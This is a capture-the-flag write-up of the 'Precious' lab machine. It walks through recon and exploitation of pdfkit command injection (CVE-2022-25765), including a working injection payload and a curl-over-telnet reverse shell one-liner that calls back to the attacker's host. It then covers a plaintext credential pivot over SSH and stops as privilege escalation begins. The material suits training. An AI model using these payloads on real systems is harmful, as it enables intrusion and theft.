# Precious

*Linux* - Precious is an Easy Difficulty Linux machine, that focuses on the `Ruby` language. It hosts a custom `Ruby` web application, using an outdated library, namely pdfkit, which is vulnerable to `CVE-2022-25765`, leading to an initial shell on the target machine. After a pivot using plaintext credentials that are found in a Gem repository `config` file, the box concludes with an insecure deserialization attack on a custom, outdated, `Ruby` script.

## 1. Submit User Flag

First add the ip address and the domain `precious.htb` to the `etc/hosts` file:

```sh
echo '10.10.11.189 precious.htb' | sudo tee -a /etc/hosts 2>/dev/null
```

Then when you visit the page, you see that there is a prompt to convert web page to PDF.

Let's scan the page with `nmap`.

```sh
nmap -sV -sC precious.htb

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-28 00:40 CET

|_http-title: Convert Web Page to PDF

```

We got two open ports 22 and 80.

From the headers we learn also about the server which is nginx, and that it uses Ruby. 

```sh
curl -I http://precious.htb

HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 483

X-Powered-By: Phusion Passenger(R) 6.0.15
Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
X-Runtime: Ruby
```

Now let's use the website. 

Create a web-server on a directory.

```sh
python3 -m http.server
```

Add your ip to the web-page, and it will download you a pdf file.

Let's view the metadata of the file, using `exiftool`.

```sh
exiftool gxk4iq5r7e4rxktdyxfffvh2brv0wcdk.pdf

ExifTool Version Number         : 13.25
File Name                       : gxk4iq5r7e4rxktdyxfffvh2brv0wcdk.pdf

```

Now we know that the app behind that did this is `pdfkit 0.8.6` and let's search for any vulnerabilities.

We found a `Command Injection` vulnerability - CVE-2022-25765, and found a PoC, which in order to check if it works, I'm going to try to `cURL` to our server, to check if we got a request.

```sh
http://10.10.14.2:8000/?name=#{'%20`curl http://10.10.14.2:8000/test`'}
```

On the web-server we see the request, and now we know that we have a working exploit here.

```sh
10.10.11.189 - - [28/Mar/2025 01:29:44] "GET /test HTTP/1.1" 404 -
```

Let's try to get a reverse shell, first start a listening service using `ncat`.

```sh
nc -nlvp 4444
```

I created a `ruby` reverse shell one-liner from www.revshells.com.

```sh
C='curl -Ns telnet://10.10.14.2:4444'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
```

And we got a reverse shell.

```sh
nc -nlvp 4444

Connection from 10.10.11.189:60456
whoami
ruby
```

Let's get the file from the `henry` directory.

We don't have access to read the `user.txt` file on `/home/henry` so we should upgrade the shell to a `TTY`.

```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

On the `/home/ruby` we have a `.bundle` directory, which hosts configuration files by `Gem` and `Ruby`.

When we read the config file, we see the plain-text password.

```sh
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Since we have a `ssh` let's try it with these credentials.

```sh
cat /home/henry/user.txt

17861cfd6697732c4f6bed35f521b534
```


## 2. Submit root flag

Let's try now the privilege escalation.

While checking for `sudo` privileges we see an entry for a `Ruby` script.

```sh
sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Let's try to run it.

```sh
sudo /usr/bin/ruby /opt/update_dependencies.rb
Traceback (most recent call last):
	2: from /opt/update_dependencies.rb:17:in `<main>'
	1: from /opt/update_dependencies.rb:10:in `list_from_file'
/opt/update_dependencies.rb:10:in `read': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT)
```
